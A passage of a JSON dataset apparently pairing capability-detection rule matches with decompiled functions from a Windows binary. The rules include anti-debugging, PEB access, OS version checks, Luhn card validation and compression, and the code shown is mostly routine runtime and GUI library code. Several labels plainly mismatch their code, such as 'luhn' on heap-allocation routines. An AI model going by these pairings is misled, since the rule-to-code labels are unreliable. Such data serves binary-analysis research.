            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b4b6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0041ef90(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "0041a782": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.0041a782(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0x400, 0, 0);\n    if (uVar1 >> 0x10 == 0x534b) {\n        uVar1 = uVar1 & 0xffff;\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 120
    },
    "0041e2b0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t * fcn.0041e2b0(uint32_t *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    \n    cVar3 = *param_2;\n    if (cVar3 == '\\0') {\n        return param_1;\n    }\n    if (param_2[1] == '\\0') {\n        uVar4 = param_1 & 3;\n        while (uVar4 != 0) {\n            if (*param_1 == cVar3) {\n                return param_1;\n            }\n            if (*param_1 == '\\0') {\n                return NULL;\n            }\n            uVar4 = param_1 + 1 & 3;\n            param_1 = param_1 + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar4 = *param_1;\n                uVar9 = uVar4 ^ CONCAT22(CONCAT11(cVar3, cVar3), CONCAT11(cVar3, cVar3));\n                uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;\n                puVar10 = param_1 + 1;\n                if (((uVar9 ^ 0xffffffff ^ uVar9 + 0x7efefeff) & 0x81010100) != 0) break;\n                param_1 = puVar10;\n                if ((uVar7 & 0x81010100) != 0) {\n                    if ((uVar7 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar4 = *param_1;\n            if (uVar4 == cVar3) {\n                return param_1;\n            }\n            if (uVar4 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 8;\n            if (cVar6 == cVar3) {\n                return param_1 + 1;\n            }\n            if (cVar6 == '\\0') break;\n            cVar6 = uVar4 >> 0x10;\n            if (cVar6 == cVar3) {\n                return param_1 + 2;\n            }\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 0x18;\n            if (cVar6 == cVar3) {\n                return param_1 + 3;\n            }\n            param_1 = puVar10;\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    do {\n        cVar6 = *param_1;\n        do {\n            while (puVar10 = param_1,  param_1 = puVar10 + 1,  cVar6 != cVar3) {\n                if (cVar6 == '\\0') {\n                    return NULL;\n                }\n                cVar6 = *param_1;\n            }\n            cVar6 = *param_1;\n            pcVar8 = param_2;\n            puVar5 = puVar10;\n        } while (cVar6 != param_2[1]);\n        do {\n            if (pcVar8[2] == '\\0') {\n                return puVar10;\n            }\n            if (*(puVar5 + 2) != pcVar8[2]) break;\n            pcVar1 = pcVar8 + 3;\n            if (*pcVar1 == '\\0') {\n                return puVar10;\n            }\n            pcVar2 = puVar5 + 3;\n            pcVar8 = pcVar8 + 2;\n            puVar5 = puVar5 + 2;\n        } while (*pcVar1 == *pcVar2);\n    } while( true );\n}\n",
        "token_count": 925
    },
    "00425c35": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425c35(char *arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_10h;\n    var_4h = *0x444220;\n    iVar1 = 0x404e;\n    *arg_10h = 0;\n    arg_10h[1] = 0;\n    arg_10h[2] = 0;\n    if (arg_ch != 0) {\n        arg_10h = arg_ch;\n        do {\n            var_10h = *puVar2;\n            var_ch = puVar2[1];\n            var_8h = puVar2[2];\n            fcn.00425bda(puVar2);\n            fcn.00425bda(puVar2);\n            fcn.00425b7c(puVar2, &var_10h);\n            fcn.00425bda(puVar2);\n            var_10h = *arg_8h;\n            var_ch = 0;\n            var_8h = 0;\n            fcn.00425b7c(puVar2, &var_10h);\n            arg_8h = arg_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != NULL);\n    }\n    if (puVar2[2] == 0) {\n        do {\n            iVar1 = iVar1 + -0x10;\n            uVar3 = puVar2[1] >> 0x10;\n            puVar2[1] = *puVar2 >> 0x10 | puVar2[1] << 0x10;\n            *puVar2 = *puVar2 << 0x10;\n        } while (uVar3 == 0);\n        puVar2[2] = uVar3;\n    }\n    while ((puVar2[2] & 0x8000) == 0) {\n        fcn.00425bda(puVar2);\n        iVar1 = iVar1 + -1;\n    }\n    *(puVar2 + 10) = iVar1;\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 557
    },
    "0042add9": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.0042add9(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00432999(0x430b6e);\n    uVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar1 + 0x68) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar1 + 0x70) = uVar2 >> 0x10;\n    *(iVar1 + 0x6c) = uVar2;\n    return iVar1 + 0x58;\n}\n",
        "token_count": 140
    },
    "0043164f": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.0043164f(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iStack148;\n    int32_t iStack144;\n    uint8_t *puStack140;\n    uchar auStack136 [128];\n    uint uStack8;\n    \n    uStack8 = *0x444220;\n    uVar2 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar5 = uVar2;\n    iStack148 = uVar2 >> 0x10;\n    if (0x20 < iVar5) {\n        iVar5 = 0x20;\n    }\n    iVar6 = iVar5 + 0xf >> 4;\n    iVar7 = ((iVar5 + -4) / 2 + iVar6 * 0x10) - iVar5;\n    if (0xc < iVar7) {\n        iVar7 = 0xc;\n    }\n    if (0x20 < iStack148) {\n        iStack148 = 0x20;\n    }\n    fcn.0041cc60(auStack136, 0xff, 0x80);\n    puVar4 = auStack136 + (iStack148 + -6 >> 1) * iVar6 * 2;\n    puStack140 = 0x4386a8;\n    iStack144 = 5;\n    do {\n        uVar1 = *puStack140;\n        uVar3 = puStack140 & 0xffff0000;\n        puStack140 = puStack140 + 1;\n        uVar3 = ~((uVar3 | uVar1) << (iVar7 & 0x1f));\n        *puVar4 = uVar3 >> 8;\n        puVar4[1] = uVar3;\n        puVar4 = puVar4 + iVar6 * 2;\n        iStack144 = iStack144 + -1;\n    } while (iStack144 != 0);\n    *0x449370 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar5, iStack148, 1, 1, auStack136);\n    if (*0x449370 == 0) {\n        *0x449370 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 549
    },
    "004132ce": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004132ce(int32_t arg_8h, uint arg_ch)\n\n{\n    ushort *in_ECX;\n    \n    if (arg_ch == 10) {\n        *in_ECX = 10;\n    }\n    else {\n        if (arg_ch == 0xb) {\n            *in_ECX = 0xb;\n            in_ECX[4] = -(arg_8h != 0);\n            return;\n        }\n        if (arg_ch == 0x16) {\n            *in_ECX = 0x16;\n        }\n        else if (arg_ch == 0x17) {\n            *in_ECX = 0x17;\n        }\n        else if (arg_ch == 0x19) {\n            *in_ECX = 0x19;\n        }\n        else if (arg_ch == 0x13) {\n            *in_ECX = 0x13;\n        }\n        else {\n            *in_ECX = 3;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    return;\n}\n",
        "token_count": 236
    },
    "0041d9b6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d9b6(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n    }\n    fcn.0041d978(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 104
    },
    "00423fc0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00423fc0(uint32_t param_1, char *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iStack1060;\n    int32_t iStack1056;\n    int32_t iStack1052;\n    char *pcStack1048;\n    int32_t iStack1044;\n    int32_t iStack1040;\n    char acStack1036 [1028];\n    uint uStack8;\n    \n    uStack8 = *0x444220;\n    iStack1052 = 0;\n    iStack1056 = 0;\n    if (param_3 == 0) goto code_r0x0042417a;\n    piVar1 = (param_1 >> 5) * 4 + 0x44aba0;\n    iVar8 = (param_1 & 0x1f) * 0x24;\n    if ((*(*piVar1 + 4 + iVar8) & 0x20) != 0) {\n        fcn.0042564e(param_1, 0, 0, 2);\n    }\n    if ((*(*piVar1 + iVar8 + 1) & 0x80) == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(*piVar1 + iVar8), param_2, param_3, &iStack1060, 0);\n        if (iVar5 == 0) {\n            iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            iStack1040 = 0;\n            iStack1052 = iStack1060;\n        }\ncode_r0x004240dc:\n        if (iStack1052 != 0) goto code_r0x0042417a;\n        if (iStack1040 != 0) {\n            if (iStack1040 == 5) {\n                puVar6 = fcn.0041da34();\n                *puVar6 = 9;\n                puVar6 = fcn.0041da3d();\n                *puVar6 = 5;\n            }\n            else {\n                fcn.0041da46(iStack1040);\n            }\n            goto code_r0x0042417a;\n        }\n    }\n    else {\n        pcStack1048 = param_2;\n        iStack1040 = 0;\n        if (param_3 != 0) {\n            do {\n                uVar7 = pcStack1048 - param_2;\n                pcVar4 = acStack1036;\n                iStack1044 = 0;\n                do {\n                    if (param_3 <= uVar7) break;\n                    pcVar3 = pcStack1048 + 1;\n                    cVar2 = *pcStack1048;\n                    uVar7 = uVar7 + 1;\n                    if (cVar2 == '\\n') {\n                        iStack1056 = iStack1056 + 1;\n                        *pcVar4 = '\\r';\n                        pcVar4 = pcVar4 + 1;\n                        iStack1044 = iStack1044 + 1;\n                    }\n                    *pcVar4 = cVar2;\n                    pcVar4 = pcVar4 + 1;\n                    iStack1044 = iStack1044 + 1;\n                    pcStack1048 = pcVar3;\n                } while (iStack1044 < 0x400);\n                iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                  (*(*piVar1 + iVar8), acStack1036, pcVar4 - acStack1036, &iStack1060, 0);\n                if (iVar5 == 0) {\n                    iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    goto code_r0x004240dc;\n                }\n                iStack1052 = iStack1052 + iStack1060;\n                if ((iStack1060 < pcVar4 - acStack1036) || (param_3 <= pcStack1048 - param_2)) goto code_r0x004240dc;\n            } while( true );\n        }\n    }\n    if (((*(*piVar1 + 4 + iVar8) & 0x40) == 0) || (*param_2 != '\\x1a')) {\n        puVar6 = fcn.0041da34();\n        *puVar6 = 0x1c;\n        puVar6 = fcn.0041da3d();\n        *puVar6 = 0;\n    }\ncode_r0x0042417a:\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 1059
    },
    "00428538": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t fcn.00428538(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00431a41();\n    return iVar1 + 0x30;\n}\n",
        "token_count": 44
    },
    "004152db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004152db(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((*(in_ECX + 0x7c) == 0) || (*(in_ECX + 0x78) == 0)) {\n        var_8h = 0;\n    }\n    else {\n        puVar2 = fcn.00428fb1(*(in_ECX + 0x7c) * 6);\n        iVar3 = (*_sym.imp.USER32.dll_CopyAcceleratorTableA)(*(in_ECX + 0x78), puVar2, *(in_ECX + 0x7c));\n        var_8h = 0;\n        var_4h = 0;\n        if (0 < iVar3) {\n            puVar4 = puVar2;\n            do {\n                if (*(arg_8h + 4) == 0x106) {\n                    uVar1 = 0x10;\n                }\n                else {\n                    uVar1 = 0;\n                }\n                if (((*puVar4 & 0xfd) == uVar1) && (*(puVar4 + 2) == *(arg_8h + 8))) {\n                    var_8h = 1;\n                    break;\n                }\n                var_4h = var_4h + 1;\n                puVar4 = puVar4 + 6;\n            } while (var_4h < iVar3);\n        }\n        fcn.00428fdc(puVar2);\n    }\n    return var_8h;\n}\n",
        "token_count": 389
    },
    "0041f71d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041f71d(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x10);\n    iVar7 = 0;\n    for (iVar3 = *(arg_8h + 8); -1 < iVar3; iVar3 = iVar3 << 1) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = iVar7 * 0x204 + 0x144 + iVar2;\n    iVar6 = 0x3f;\n    iVar4 = iVar3;\n    do {\n        *(iVar4 + 8) = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar8 = iVar7 * 0x8000 + *(arg_8h + 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(uVar8, 0x8000, 0x1000, 4);\n    if (iVar4 == 0) {\n        iVar7 = -1;\n    }\n    else {\n        if (uVar8 <= uVar8 + 0x7000) {\n            piVar5 = uVar8 + 0x10;\n            iVar4 = ((uVar8 + 0x7000) - uVar8 >> 0xc) + 1;\n            do {\n                piVar5[-2] = -1;\n                piVar5[0x3fb] = -1;\n                *piVar5 = piVar5 + 0x3ff;\n                piVar5[-1] = 0xff0;\n                piVar5[1] = piVar5 + -0x401;\n                piVar5[0x3fa] = 0xff0;\n                piVar5 = piVar5 + 0x400;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *(iVar3 + 0x1fc) = uVar8 + 0xc;\n        *(uVar8 + 0x14) = iVar3 + 0x1f8;\n        *(iVar3 + 0x200) = uVar8 + 0x700c;\n        *(uVar8 + 0x7010) = iVar3 + 0x1f8;\n        *(iVar2 + 0x44 + iVar7 * 4) = 0;\n        *(iVar2 + 0xc4 + iVar7 * 4) = 1;\n        cVar1 = *(iVar2 + 0x43);\n        *(iVar2 + 0x43) = cVar1 + '\\x01';\n        if (cVar1 == '\\0') {\n            *(arg_8h + 4) = *(arg_8h + 4) | 1;\n        }\n        *(arg_8h + 8) = *(arg_8h + 8) & ~(0x80000000U >> (iVar7 & 0x1f));\n    }\n    return iVar7;\n}\n",
        "token_count": 765
    },
    "00424d45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424d45(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint32_t var_4h;\n    \n    uVar1 = *(arg_ch + 6);\n    var_4h = 0x80000000;\n    uVar3 = uVar1 >> 4;\n    uVar4 = uVar3 & 0x7ff;\n    uVar2 = *arg_ch;\n    if ((uVar3 & 0x7ff) == 0) {\n        if (((arg_ch[1] & 0xfffff) == 0) && (uVar2 == 0)) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 2) = 0;\n            return;\n        }\n        uVar4 = uVar4 + 0x3c01;\n        var_4h = 0;\n    }\n    else if (uVar4 == 0x7ff) {\n        uVar4 = 0x7fff;\n    }\n    else {\n        uVar4 = uVar4 + 0x3c00;\n    }\n    arg_8h[1] = uVar2 >> 0x15 | (arg_ch[1] & 0xfffff) << 0xb | var_4h;\n    *arg_8h = uVar2 << 0xb;\n    while (var_4h == 0) {\n        uVar2 = arg_8h[1];\n        uVar4 = uVar4 - 1;\n        arg_8h[1] = uVar2 << 1 | *arg_8h >> 0x1f;\n        *arg_8h = *arg_8h * 2;\n        var_4h = uVar2 << 1 & 0x80000000;\n    }\n    *(arg_8h + 2) = uVar1 & 0x8000 | uVar4;\n    return;\n}\n",
        "token_count": 480
    },
    "00425bda": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid fcn.00425bda(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *param_1 = uVar1 * 2;\n    param_1[1] = uVar2 * 2 | uVar1 >> 0x1f;\n    param_1[2] = param_1[2] << 1 | uVar2 >> 0x1f;\n    return;\n}\n",
        "token_count": 126
    },
    "0041be1b": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0041be1b(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0041e005();\n    iVar4 = *(iVar4 + 0x60);\n    if (iVar4 != *0x44acc8) {\n        iVar4 = fcn.0041d16e();\n    }\n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (*(iVar4 + 8) == 0) {\n        iVar4 = fcn.00420042(arg_8h, arg_ch, arg_10h);\n        return iVar4;\n    }\n    do {\n        uVar2 = *arg_8h;\n        var_8h._0_2_ = uVar2;\n        iVar3 = arg_10h + -1;\n        puVar5 = arg_8h + 1;\n        if ((*(uVar2 + 0x1d + iVar4) & 4) == 0) {\n            iVar1 = uVar2 + iVar4;\n            arg_8h = puVar5;\n            if ((*(iVar1 + 0x1d) & 0x10) != 0) {\n                var_8h._0_2_ = *(iVar1 + 0x11d);\n            }\ncode_r0x0041bef2:\n            uVar6 = *arg_ch;\n            puVar7 = arg_ch + 1;\n            if ((*(uVar6 + 0x1d + iVar4) & 4) == 0) {\n                if ((*(uVar6 + iVar4 + 0x1d) & 0x10) != 0) {\n                    uVar6 = *(uVar6 + iVar4 + 0x11d);\n                }\n                goto code_r0x0041bf60;\n            }\n            if (iVar3 == 0) {\ncode_r0x0041bf14:\n                arg_10h = iVar3;\n                var_4h._0_2_ = 0;\n            }\n            else {\n                uVar2 = *puVar7;\n                iVar3 = arg_10h + -2;\n                if (uVar2 == 0) goto code_r0x0041bf14;\n                puVar7 = arg_ch + 2;\n                var_4h._0_2_ = CONCAT11(*arg_ch, uVar2);\n                arg_10h = iVar3;\n                if ((var_4h < *(iVar4 + 0x10)) || (*(iVar4 + 0x12) <= var_4h && var_4h != *(iVar4 + 0x12))) {\n                    if ((*(iVar4 + 0x16) <= var_4h) && (var_4h < *(iVar4 + 0x18) || var_4h == *(iVar4 + 0x18))) {\n                        var_4h._0_2_ = var_4h + *(iVar4 + 0x1a);\n                    }\n                }\n                else {\n                    var_4h._0_2_ = var_4h + *(iVar4 + 0x14);\n                }\n            }\n        }\n        else {\n            if (iVar3 != 0) {\n                if (*puVar5 == 0) {\n                    var_8h._0_2_ = 0;\n                    arg_8h = puVar5;\n                }\n                else {\n                    arg_8h = arg_8h + 2;\n                    var_8h._0_2_ = CONCAT11(uVar2, *puVar5);\n                    if ((var_8h < *(iVar4 + 0x10)) || (*(iVar4 + 0x12) <= var_8h && var_8h != *(iVar4 + 0x12))) {\n                        if ((*(iVar4 + 0x16) <= var_8h) && (var_8h < *(iVar4 + 0x18) || var_8h == *(iVar4 + 0x18))) {\n                            var_8h._0_2_ = var_8h + *(iVar4 + 0x1a);\n                        }\n                    }\n                    else {\n                        var_8h._0_2_ = var_8h + *(iVar4 + 0x14);\n                    }\n                }\n                goto code_r0x0041bef2;\n            }\n            uVar6 = *arg_ch;\n            if ((*(uVar6 + 0x1d + iVar4) & 4) != 0) {\n                return 0;\n            }\n            var_8h._0_2_ = 0;\n            puVar7 = arg_ch;\n            arg_8h = puVar5;\ncode_r0x0041bf60:\n            var_4h._0_2_ = uVar6;\n            arg_10h = iVar3;\n        }\n        if (var_4h != var_8h) {\n            return (-(var_4h < var_8h) & 2) - 1;\n        }\n        if (var_8h == 0) {\n            return 0;\n        }\n        arg_ch = puVar7;\n        if (arg_10h == 0) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 1255
    },
    "00424ad0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424ad0(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_18h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = arg_8h[5];\n    var_ch = *(arg_8h + 3);\n    var_8h = *(arg_8h + 1);\n    var_4h = *arg_8h << 0x10;\n    uVar5 = uVar1 & 0x7fff;\n    iVar6 = uVar5 - 0x3fff;\n    if (iVar6 == -0x3fff) {\n        iVar6 = 0;\n        uVar5 = fcn.00424a3c();\n        uVar2 = uVar5;\n        if (uVar5 != 0) {\ncode_r0x00424be8:\n            uVar3 = 0;\n            goto code_r0x00424bea;\n        }\n    }\n    else {\n        fcn.00424a21(&var_18h, &var_ch);\n        iVar4 = fcn.004249af(&var_ch, arg_10h[2]);\n        if (iVar4 != 0) {\n            iVar6 = uVar5 - 0x3ffe;\n        }\n        iVar4 = arg_10h[1];\n        if (iVar6 < iVar4 - arg_10h[2]) {\n            var_ch = 0;\n            var_8h = 0;\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n        else {\n            if (iVar4 < iVar6) {\n                if (*arg_10h <= iVar6) {\n                    var_8h = 0;\n                    var_4h = 0;\n                    var_ch = 0x80000000;\n                    fcn.00424a55(&var_ch, arg_10h[3]);\n                    iVar6 = arg_10h[5] + *arg_10h;\n                    uVar3 = 1;\n                    goto code_r0x00424bea;\n                }\n                var_ch = var_ch & 0x7fffffff;\n                iVar6 = arg_10h[5] + iVar6;\n                fcn.00424a55(&var_ch, arg_10h[3]);\n                goto code_r0x00424be8;\n            }\n            fcn.00424a21(&var_ch, &var_18h);\n            fcn.00424a55(&var_ch, iVar4 - iVar6);\n            fcn.004249af(&var_ch, arg_10h[2]);\n            fcn.00424a55(&var_ch, arg_10h[3] + 1);\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n    }\n    var_8h = uVar2;\n    var_ch = uVar5;\n    iVar6 = 0;\n    uVar3 = 2;\ncode_r0x00424bea:\n    var_ch = iVar6 << (0x1fU - arg_10h[3] & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_ch;\n    if (arg_10h[4] == 0x40) {\n        arg_ch[1] = var_ch;\n        *arg_ch = var_8h;\n    }\n    else if (arg_10h[4] == 0x20) {\n        *arg_ch = var_ch;\n    }\n    return uVar3;\n}\n",
        "token_count": 861
    },
    "0042427d": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint8_t fcn.0042427d(uint32_t param_1)\n\n{\n    if (*0x44ab84 <= param_1) {\n        return 0;\n    }\n    return *(*((param_1 >> 5) * 4 + 0x44aba0) + 4 + (param_1 & 0x1f) * 0x24) & 0x40;\n}\n",
        "token_count": 90
    },
    "0042558c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042558c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bf50, 8);\n    uVar2 = *(unaff_EBP + 8);\n    iVar1 = *((uVar2 >> 5) * 4 + 0x44aba0) + (uVar2 & 0x1f) * 0x24;\n    if (*(iVar1 + 8) == 0) {\n        fcn.0041f23f(10);\n        *(unaff_EBP + -4) = 0;\n        if (*(iVar1 + 8) == 0) {\n            iVar3 = fcn.00423cc4(iVar1 + 0xc, 4000);\n            if (iVar3 == 0) {\n                fcn.0041b84a(unaff_EBP + -0x10, 0xffffffff);\n                goto code_r0x0042561a;\n            }\n            *(iVar1 + 8) = *(iVar1 + 8) + 1;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00425623();\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((uVar2 >> 5) * 4 + 0x44aba0) + 0xc + (uVar2 & 0x1f) * 0x24);\ncode_r0x0042561a:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 398
    },
    "0042562c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0042562c(uint32_t param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((param_1 >> 5) * 4 + 0x44aba0) + 0xc + (param_1 & 0x1f) * 0x24);\n    return;\n}\n",
        "token_count": 75
    },
    "0042564e": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
